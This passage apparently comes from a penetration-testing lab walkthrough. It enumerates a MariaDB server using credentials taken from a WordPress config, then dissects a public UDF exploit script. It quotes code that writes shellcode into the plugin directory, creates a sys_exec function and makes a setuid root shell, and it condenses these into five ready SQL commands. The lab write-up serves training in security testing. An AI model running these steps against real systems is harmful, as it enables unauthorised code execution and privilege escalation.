What we know:
- Because of WP server access, we know the host is on a different network that we are currently on
- We know it's running MariaDB version 10.3.20
	- This appears to be a fairly new version which is unlikely to have many/any RCE vulns

Lets connect to the DB and start Enumerating other aspects of MariaDB.

### Application/Service Enumeration

We can connect to MariaDB with Kali's built-in MySQL client, using the creds we recovered from the WP Config File. MariaDB is technically a different package, but was designed to be backwards compatible with MySQL.

We need to point the MySQL client to the tunnel running on Kali on port 13306:
Kali>
`mysql --host=127.0.0.1 --port=13306 --user=wp -p`

We are now connected. Lets look at the privs of the 'wp' user and get and idea of how this MariaDB instance is config'd:
MariaDB \[(none)]>
`SHOW Grants;``
```
+------------------------------------------------------------------------------------+
| Grants for wp@% |
+------------------------------------------------------------------------------------+
| GRANT USAGE ON *.* TO 'wp'@'%' IDENTIFIED BY PASSWORD '*61163AE4B131AB0E43F07BE7B' |
| GRANT SELECT, INSERT, UPDATE, DELETE ON `wordpress`.* TO 'wp'@'%' |
+------------------------------------------------------------------------------------+
2 rows in set (0.075 sec)
```

We don’t have "\*" permissions, but SELECT, INSERT, UPDATE, and DELETE are a good startingpoint. 

Next, let’s take a look at some variables and see if we can find anything that stands out:
MariaDB \[(none)]>
`SHOW variables;`
```
MariaDB [(none)]> show variables;
+------------------------------------------+--------------------------------------+
| Variable_name | Value |
+------------------------------------------+--------------------------------------+
| alter_algorithm | DEFAULT |
| aria_block_size | 8192 |
| aria_checkpoint_interval | 30 |
...
| hostname | zora |
| identity | 0 |
...
| pid_file | /run/mysqld/mariadb.pid |
| plugin_dir | /home/dev/plugin/ |
| plugin_maturity | gamma |
| port | 3306 |
| preload_buffer_size | 32768 |
| profiling | OFF |
...
| tmp_memory_table_size | 16777216 |
| tmp_table_size | 16777216 |
| tmpdir | /var/tmp |
| transaction_alloc_block_size | 8192 |
...
| userstat | OFF |
| version | 10.3.20-MariaDB |
| version_comment | MariaDB Server |
| version_compile_machine | x86_64 |
| version_compile_os | Linux |
| version_malloc_library | system |
...
| wsrep_sst_receive_address | AUTO |
| wsrep_start_position | 00000000-0000-0000-0000-000000000000:|
| wsrep_sync_wait | 0 |
+------------------------------------------+--------------------------------------+
639 rows in set (0.154 sec)
```

Findings:
- hostname is 'zora'
- tmp directory is '/var/tmp'
- Confirmed MariaDB version
- Arch is x86_64
- plugin_dir is set to /home/dev/plugin/
	- This is a non-standard directory for MariaDB. Might come in handy.

Look for exploits:
Kali>
`searchsploit mariadb`

None of these work for our version.

Expand search:
Kali>
`searchsploit mysql`

There are a variety of results. The issue is that the exact version numbers between MySQL and MariaDB are not going to match.  Instead, we will try to identify a pattern of publicly disclosed exploits that may indicate the type of attack we could use.

Notice that "UDF" and "User Defined" show up pretty often.

Looking at /usr/share/exploitdb/exploits/linux/local/46249.py leads us to some research and PoC's on exploit DB.

Reading the papter on UDF tells us that a UDF is similar to a custom plugin for MySQL that allows DB admins to create custom repeatable functions to accomplish specific objectives. Conveniently, UDFs are written in C or C++ and can run almost any commands including system commands. 

This specific exploit uses UDFs to escalate privs on the host. However, we should be able to use the same principle to get an inital shell.

We will do some modification, but first review the code.

The first thing we notice is a shellcode variable defined on lines 40-45.
```
40 shellcode_x32 = "7f454c4601010100000000000000000...";
41 shellcode_x64 = "7f454c4602010100000000000000000...";
42
43 shellcode = shellcode_x32
44 if (platform.architecture()[0] == '64bit'):
45 shellcode = shellcode_x64
```

The SQL query at line 71 obtains the plugin directory (remember this is the variable that we found was not standard on Zora).
```
71 cmd='mysql -u root -p\'' + password + '\' -e "select @@plugin_dir \G"'
72 plugin_str = subprocess.check_output(cmd, shell=True)
73 plugin_dir = re.search('@plugin_dir: (\S*)', plugin_str)
74 res = bool(plugin_dir)
```


Next, on line 92, the code dumps the shellcode binary content into a file within the plugin directory.
```
91 print "Trying to create a udf library...";
92 os.system('mysql -u root -p\'' + password + '\' -e "select binary 0x' + shellcode
+ ' into dumpfile \'%s\' \G"' % udf_outfile)
93 res = os.path.isfile(udf_outfile)
```

Line 101 creates a function named sys_exec leveraging the uploaded binary file.
```
99 print "UDF library crated successfully: %s" % udf_outfile;
100 print "Trying to create sys_exec..."
101 os.system('mysql -u root -p\'' + password + '\' -e "create function sys_exec
returns int soname \'%s\'\G"' % udf_filename)
102
103 print "Checking if sys_exec was crated..."
```

Finally, the script checks if the function was successfully created on line 104 and if this is the case, the function is executed on line 113.
```
104 cmd='mysql -u root -p\'' + password + '\' -e "select * from mysql.func where
name=\'sys_exec\' \G"';
105 res = subprocess.check_output(cmd, shell=True);
...
110 if res:
111 print "sys_exec was found: %s" % res
112 print "Generating a suid binary in /tmp/sh..."
113 os.system('mysql -u root -p\'' + password + '\' -e "select sys_exec(\'cp
/bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh\')"')
114
115 print "Trying to spawn a root shell..."
116 pty.spawn("/tmp/sh");
```

Reading about the MySQL CREATE FUNCTION syntax suggest the binary content of the shellcode variable is supposed to be a shared library that implements and exports the function(s) we want to create within the DB.

The 5 essential commands that make the script run:
```
select @@plugin_dir

select binary 0xshellcode into dumpfile @@plugin_dir;

create function sys_exec returns int soname udf_filename;

select * from mysql.func where name='sys_exec' \G

select sys_exec('cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh')
```

Since we have an interactive MariaDB shell, we could theoretically run these commands directly in the MariaDB shell against Zora.

We need to understand what we are about to execute before proceeding.

